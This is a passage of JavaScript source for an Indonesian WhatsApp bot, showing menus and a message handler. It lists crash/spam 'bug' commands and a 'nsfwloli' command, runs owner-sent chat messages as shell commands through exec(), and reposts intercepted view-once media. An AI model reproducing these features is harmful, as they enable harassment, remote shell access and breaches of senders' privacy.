├• ${prefix}bisakah
├• ${prefix}bagaimanakah
├• ${prefix}rate
├• ${prefix}gantengcek
├• ${prefix}cekganteng
├• ${prefix}cantikcek
├• ${prefix}cekcantik
├• ${prefix}sangecek
├• ${prefix}ceksange
├• ${prefix}gaycek
├• ${prefix}cekgay
├• ${prefix}lesbicek
├• ${prefix}ceklesbi
├• ${prefix}wangy
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'bugmenu':
case 'menubug': {
    let capt = `
*This is the _Bug_ of menu in this bot*
${readMore}
╭─────┈『 *BUG MENU* 』
│${petik}
├• ${prefix}santet
├• ${prefix}bugs
├• ${prefix}buglink
├• ${prefix}spams
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'nsfwmenu':
case 'menunsfw': {
let capt = `
*This is the _NSFW_ of menu in this bot*
${readMore}
╭─────┈『 *NSFW MENU* 』
│${petik}
├• ${prefix}hentai
├• ${prefix}gifhentai
├• ${prefix}gifblowjob
├• ${prefix}hentaivid
├• ${prefix}hneko
├• ${prefix}nwaifu
├• ${prefix}animespank
├• ${prefix}trap
├• ${prefix}gasm
├• ${prefix}ahegao
├• ${prefix}ass
├• ${prefix}bdsm
├• ${prefix}blowjob
├• ${prefix}cuckold
├• ${prefix}cum
├• ${prefix}milf
├• ${prefix}eba
├• ${prefix}ero
├• ${prefix}femdom
├• ${prefix}foot
├• ${prefix}gangbang
├• ${prefix}glasses
├• ${prefix}jahy
├• ${prefix}masturbation
├• ${prefix}manga
├• ${prefix}neko-hentai
├• ${prefix}neko-hentai2
├• ${prefix}nsfwloli
├• ${prefix}orgy
├• ${prefix}panties 
├• ${prefix}pussy
├• ${prefix}tentacles
├• ${prefix}thighs
├• ${prefix}yuri
├• ${prefix}zettai
├• ${prefix}xnxxsearch
├• ${prefix}xnxxdl
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'textpromenu':
case 'menutextpro': {
    let capt = `
*This is the _TextPro_ of menu in this bot*
${readMore}
╭─────┈『 *TEXTPRO MENU* 』
│${petik}
├• ${prefix}candy
├• ${prefix}christmas
├• ${prefix}3dchristmas
├• ${prefix}sparklechristmas
├• ${prefix}deepsea
├• ${prefix}scifi
├• ${prefix}rainbow
├• ${prefix}waterpipe
├• ${prefix}spooky
├• ${prefix}pencil
├• ${prefix}circuit
├• ${prefix}discovery
├• ${prefix}metalic
├• ${prefix}fiction
├• ${prefix}demon
├• ${prefix}transformer
├• ${prefix}berry
├• ${prefix}thunder
├• ${prefix}magma
├• ${prefix}3dstone
├• ${prefix}neonlight
├• ${prefix}glitch
├• ${prefix}harrypotter
├• ${prefix}brokenglass
├• ${prefix}papercut
├• ${prefix}watercolor
├• ${prefix}multicolor
├• ${prefix}neondevil
├• ${prefix}underwater
├• ${prefix}graffitibike
├• ${prefix}snow
├• ${prefix}cloud
├• ${prefix}honey
├• ${prefix}ice
├• ${prefix}fruitjuice
├• ${prefix}biscuit
├• ${prefix}wood
├• ${prefix}chocolate
├• ${prefix}strawberry
├• ${prefix}matrix
├• ${prefix}blood
├• ${prefix}dropwater
├• ${prefix}toxic
├• ${prefix}lava
├• ${prefix}rock
├• ${prefix}bloodglas
├• ${prefix}hallowen
├• ${prefix}darkgold
├• ${prefix}joker
├• ${prefix}wicker
├• ${prefix}firework
├• ${prefix}skeleton
├• ${prefix}blackpink
├• ${prefix}sand
├• ${prefix}glue
├• ${prefix}1917
├• ${prefix}leaves
├• ${prefix}retro
├• ${prefix}pornhub
├• ${prefix}8bit
├• ${prefix}batman
├• ${prefix}3dbox
├• ${prefix}lion
├• ${prefix}3davengers
├• ${prefix}window
├• ${prefix}3dspace
├• ${prefix}bokeh
├• ${prefix}holographic
├• ${prefix}thewall
├• ${prefix}carbon
├• ${prefix}whitebear
├• ${prefix}metallic
├• ${prefix}steel
├• ${prefix}fabric
├• ${prefix}ancient
├• ${prefix}marvel
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'photooxymenu':
case 'menuphotooxy': {
    let capt = `
*This is the _PhotoOxy_ of menu in this bot*
${readMore}
╭─────┈『 *PHOTOOXY MENU* 』
│${petik}
├• ${prefix}shadow 
├• ${prefix}write 
├• ${prefix}romantic 
├• ${prefix}burnpaper
├• ${prefix}smoke 
├• ${prefix}narutobanner 
├• ${prefix}love 
├• ${prefix}undergrass
├• ${prefix}doublelove 
├• ${prefix}coffecup
├• ${prefix}underwaterocean
├• ${prefix}smokyneon
├• ${prefix}starstext
├• ${prefix}rainboweffect
├• ${prefix}balloontext
├• ${prefix}metalliceffect
├• ${prefix}embroiderytext
├• ${prefix}flamingtext
├• ${prefix}stonetext
├• ${prefix}writeart
├• ${prefix}summertext
├• ${prefix}wolfmetaltext
├• ${prefix}nature3dtext
├• ${prefix}rosestext
├• ${prefix}naturetypography
├• ${prefix}quotesunder
├• ${prefix}shinetext
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'ephotomenu':
case 'menuephoto': {
    let capt = `
*This is the _Ephoto_ of menu in this bot*
${readMore}
╭─────┈『 *EPHOTO 360 MENU* 』
│${petik}
├• ${prefix}glitchtext
├• ${prefix}writetext
├• ${prefix}advancedglow
├• ${prefix}typographytext
├• ${prefix}pixelglitch
├• ${prefix}neonglitch
├• ${prefix}flagtext
├• ${prefix}flag3dtext
├• ${prefix}deletingtext
├• ${prefix}blackpinkstyle
├• ${prefix}glowingtext
├• ${prefix}underwatertext
├• ${prefix}logomaker
├• ${prefix}cartoonstyle
├• ${prefix}papercutstyle
├• ${prefix}watercolortext
├• ${prefix}effectclouds
├• ${prefix}blackpinklogo
├• ${prefix}gradienttext
├• ${prefix}summerbeach
├• ${prefix}luxurygold
├• ${prefix}multicoloredneon
├• ${prefix}sandsummer
├• ${prefix}galaxywallpaper
├• ${prefix}1917style
├• ${prefix}makingneon
├• ${prefix}royaltext
├• ${prefix}freecreate
├• ${prefix}galaxystyle
├• ${prefix}lighteffects
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
default:
/*if (!isCmd) {
if (command)
m.reply("Kasih Jeda 3 Detik Tod!!!\nGw Gak Bakal Respon Kalo Spam!!!")
await sleep(3000)
}*/

if ((budy) && ["Assalamualaikum", "assalamualaikum","Assalamu'alaikum", "assalamu'alaikum"].includes(budy) && !isCmd) {
HuBotZ.sendMessage(m.chat, {
    audio: {
        url: `https://pomf2.lain.la/f/pgtcblmc.opus`
    }, mimetype:'audio/mpeg', ptt:true },
{quoted: m})
}

/*  if (budy.startsWith('>') || budy.startsWith('=>') ) {
          if (!isCreator) return reply(mess.OnlyOwner)
         // if(!m.key.fromMe) return;
          const syntaxerror = require ("syntax-error")
          var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
          try {
            var yo = util.format(await eval(`(async()=>{ ${arg} })()`))
            HuBotZ.sendMessage(from, {text: yo }, { quoted: m })
          } catch (e) {
            let _syntax = ""
            let _err = util.format(e)
            let err = syntaxerror(arg, "EvalError", {
              allowReturnOutsideFunction: true,
              allowAwaitOutsideFunction: true,
              sourceType: "module"
            })
            if (err) _syntax = err + "\n\n"
            HuBotZ.sendMessage(from, { text: util.format(_syntax + _err) }, { quoted: m })
          }
}*/

  if(budy.startsWith('$')){
          if (!isCreator) return reply(mess.OnlyOwner)
          try {
            exec(args.join(" "), function(er, st) {
              if (er) HuBotZ.sendMessage(from, { text: util.format(er.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))}, {
                quoted: m
              })
              if (st) HuBotZ.sendMessage(from, { text: util.format(st.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '')) }, {
                quoted: m
              })
            })
          } catch (e) {
            console.warn(e)
          }
              }

if (m.mtype == 'viewOnceMessageV2') {
if (!global.antiViewOnce) return
let msg = m.message.viewOnceMessageV2.message
 console.log(msg)
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
 for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
 }
let teks = `「 *ANTI VIEWONCE MESSAGE* 」

📛 *Name* : ${m.pushName}
👤 *User* : @${m.sender.split("@")[0]}
⏰ *Clock* : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
✍️ *MessageType* : ${m.mtype}
💬 *Caption* : ${m.msg.caption ? m.msg.caption : "no caption"}`

await HuBotZ.sendTextWithMentions(m.chat, teks, m)
await delay(500)
if (/video/.test(type)) {
return HuBotZ.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
}
else if (/image/.test(type)) {
return HuBotZ.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.menfes = this.menfes ? this.menfes : {}
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}
} : {})
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(m.sender))
if (room) {
let other = room.other(m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

}

} catch (err) {
console.log(chalk.bgRed(color("[  ERROR  ]", "black")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if (!public) return
public = false
await HuBotZ.sendMessage("6281383141734@s.whatsapp.net", {
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
public = true
 HuBotZ.sendMessage("6281383141734@s.whatsapp.net", {
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}

if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if (console) {
HuBotZ.sendMessage("6281383141734@s.whatsapp.net", {
text: `Hai Developer, Sepertinya Ada Error Disini, Errornya: ` + util.format(e),
contextInfo: {
forwardingScore: 9999999, 
isForwarded: true
}})
}
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.blueBright(`${__filename} TELAH DI UPDATE`))
delete require.cache[file]
require(file)
})